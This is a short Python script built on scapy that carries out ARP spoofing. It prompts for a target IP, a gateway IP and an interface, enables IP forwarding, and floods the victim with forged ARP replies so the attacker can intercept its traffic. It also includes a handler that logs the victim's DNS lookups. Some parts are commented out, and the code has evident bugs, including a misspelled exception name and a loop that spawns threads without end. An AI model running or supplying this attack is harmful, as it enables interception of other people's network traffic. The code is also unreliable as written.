from scapy.all import *
import threading
import os
import sys
print ("\n Make sure you are running as root!, and enjoy.")
VIP = input ("target ip:")
GW = input ("gateway ip:")
IFACE = input ("your interface:")
print ("\t\t\nPoisoning Target and Gateway! ...")
os.system ("sysctl net.ipv4.ip_forward=1")

def dnshadle(pkt):
	if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
		print ("Victim" + VIP + "has searched for" + pkt.getlayer(DNS))
def v_poison():
	v = ARP(pdst=VIP, psrc=GW)
	while True:
		try:
			send(v,verbose=0,inter=1,loop=1)
		except KeyboardInterupt:
			sys.exit(1)
def gw_poison():
	gw = ARP(pdst=GW, psrc=VIP)
	while True:
		try:
			send(gw,verbose=0,inter=1,loop=1)
		except KeyboardInterupt:
			sys.exit(1)
vthread = []
gwthread = []

while True:
	vpoison = threading.Thread(target=v_poison)
	vpoison.setDaemon(True)
	vthread.append(vpoison)
	vpoison.start()

	gwpoison = threading.Thread(target=gw_poison)
	gwpoison.setDaemon(True)
	gwthread.append(gwpoison)
	#gwpoison.start()
	#pkt = sniff(iface=IFACE, filter = "udp port 53", prn=dnshadle)
